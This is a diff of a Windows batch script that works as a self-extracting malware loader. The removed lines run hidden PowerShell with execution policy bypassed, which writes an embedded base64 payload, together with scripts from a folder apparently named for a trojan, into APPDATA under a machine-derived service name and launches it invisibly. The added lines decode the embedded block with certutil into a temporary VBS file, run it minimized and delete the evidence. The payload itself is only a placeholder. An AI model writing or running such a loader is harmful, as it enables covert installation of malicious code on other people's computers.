@@ -1,8 +1,30 @@
 @echo off
-setlocal EnableExtensions
-powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { $p='%~f0'; $t=[IO.File]::ReadAllText($p); $m=[regex]::Match($t,'(?s)::BEGIN_B64::\r?\n(.+?)\r?\n::END_B64::'); if (-not $m.Success) { exit 1 }; $bytes=[Convert]::FromBase64String($m.Groups[1].Value.Trim()); $suffix='service'; $maxBase=32-$suffix.Length; $n=[Environment]::MachineName; if ([string]::IsNullOrWhiteSpace($n)) { $base='Hephaestus' } else { $sb=[System.Text.StringBuilder]::new(); foreach ($ch in $n.ToCharArray()) { if ([char]::IsLetterOrDigit($ch) -or $ch -eq '-' -or $ch -eq '_') { [void]$sb.Append($ch) } else { [void]$sb.Append('_') } }; $base=$sb.ToString().Trim('_'); if ([string]::IsNullOrWhiteSpace($base)) { $base='Hephaestus' } }; if ($base.Length -gt $maxBase) { $base=$base.Substring(0,$maxBase) }; $dname=$base+$suffix; $bodyPath=Join-Path (Join-Path $env:APPDATA $dname) ($dname+'_b.ps1'); $dir=Split-Path $bodyPath; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $pack=Join-Path (Split-Path $p) 'troyanps'; if (Test-Path $pack) { Get-ChildItem $pack -Filter '*.ps1' -File | Copy-Item -Destination $dir -Force }; [IO.File]::WriteAllBytes($bodyPath,$bytes); Set-Location $dir; $proc=Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',$bodyPath -WindowStyle Hidden -PassThru; $proc.WaitForExit() }"
-endlocal
+if /I "%~1"=="_h" goto main
+start "" /min cmd /c "%~f0" _h
 exit /b
+:main
+setlocal EnableExtensions EnableDelayedExpansion
+set "B64F=%TEMP%\h%RANDOM%%RANDOM%.b64"
+set "VBSF=%TEMP%\h%RANDOM%%RANDOM%.vbs"
+set "CAP=0"
+>"%B64F%" (
+  for /f "usebackq delims=" %%L in ("%~f0") do (
+    if "!CAP!"=="1" (
+      if /I "%%L"=="::END_B64::" (
+        set "CAP=0"
+      ) else (
+        echo(%%L
+      )
+    )
+    if /I "%%L"=="::BEGIN_B64::" set "CAP=1"
+  )
+)
+certutil -f -decode "%B64F%" "%VBSF%" >nul 2>&1
+del /f /q "%B64F%" >nul 2>&1
+start "" /min /wait "%VBSF%"
+set "EC=!ERRORLEVEL!"
+del /f /q "%VBSF%" >nul 2>&1
+endlocal & exit /b %EC%
 ::BEGIN_B64::
 0102
 ::END_B64::
